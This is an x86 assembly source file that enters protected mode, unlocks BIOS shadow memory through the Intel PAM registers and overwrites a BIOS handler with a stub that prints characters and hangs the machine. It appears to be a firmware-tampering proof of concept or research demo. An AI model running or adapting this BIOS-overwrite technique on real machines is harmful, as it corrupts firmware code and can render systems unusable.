.global own_bios

.align 4

.code16
own_bios:
  push %bp
  mov %sp, %bp

  cli
  // Register our gtd
  lgdt gdtr
  // Go into the protected mode
  mov %cr0, %eax
  or $0x1, %al
  mov %eax, %cr0
  // Select the good segments for the gdt
  jmpl $0x08, $next
.code32
next:
  mov $0x10, %ax
  mov %ax, %ds
  mov %ax, %es
  mov %ax, %fs
  mov %ax, %gs
  mov %ax, %ss
  /* unprotect the BIOS memory */
  // XXX Unprotecting the bios memory
  // Copying the BIOS flash in ram
  // See Intel 3rd generation core PAM0-PAM6
  movb $0x30, 0xf8000080
  movb $0x30, 0xf8000081
  movb $0x33, 0xf8000082
  movb $0x00, 0xf80f80d8

  // Own the handler
  cld
  mov $bioshang_start, %esi
  mov $0xf80c1, %edi
  mov $(bioshang_end - bioshang_start), %ecx
  rep movsb

  // Restore 16 bits segments
  mov $0x20, %ax
  mov %ax, %ds
  mov %ax, %es
  mov %ax, %fs
  mov %ax, %gs
  mov %ax, %ss
  jmpl $0x18, $end 
.code16  
end:
  // Go back to real mode dudes
  mov %cr0, %eax
  and $0xfffe, %ax
  mov %eax, %cr0
  // Real mode segments
  xor %eax, %eax
  mov %ax, %ds
  mov %ax, %es
  mov %ax, %fs
  mov %ax, %gs
  mov %ax, %ss
  mov %bp, %sp
  jmpl $0x0, $very_end
.code16
very_end:
  pop %bp
  ret

.code16
bioshang_start:
  mov $0xb800, %ax
  mov %ax, %ds
  movw $0x764, 0x0
  movw $0x765, 0x2
  movw $0x766, 0x4
here:
  jmp here
bioshang_end:

/*
 * Descriptors.
 */

.macro GDT_ENTRY_16 type, base, limit
  .word (((\limit) >> 12) & 0xffff)
  .word (((\base)  >>  0) & 0xffff)
  .byte (0x00 + (((\base)  >> 16) & 0xff))
  .byte (0x90 + (((\type)  >>  0) & 0x6f))
  .byte (0x80 + (((\limit) >> 28) & 0x0f))
  .byte (0x00 + (((\base)  >> 24) & 0xff))
.endm

.macro GDT_ENTRY_32 type, base, limit
  .word (((\limit) >> 12) & 0xffff)
  .word (((\base)  >>  0) & 0xffff)
  .byte (0x00 + (((\base)  >> 16) & 0xff))
  .byte (0x90 + (((\type)  >>  0) & 0x6f))
  .byte (0xC0 + (((\limit) >> 28) & 0x0f))
  .byte (0x00 + (((\base)  >> 24) & 0xff))
.endm

gdt:
  GDT_ENTRY_32 0x0,                               0x0, 0x00000000
  GDT_ENTRY_32 0x8 /* SEG X */ + 0x2 /* SEG R */, 0x0, 0xffffffff
  GDT_ENTRY_32 0x2 /* SEG W */,                   0x0, 0xffffffff
  GDT_ENTRY_16 0x8 /* SEG X */ + 0x2 /* SEG R */, 0x0, 0xffffffff
  GDT_ENTRY_16 0x2 /* SEG W */,                   0x0, 0xffffffff
gdt_end:

gdtr:
  .word gdt_end - gdt - 1
  .long gdt
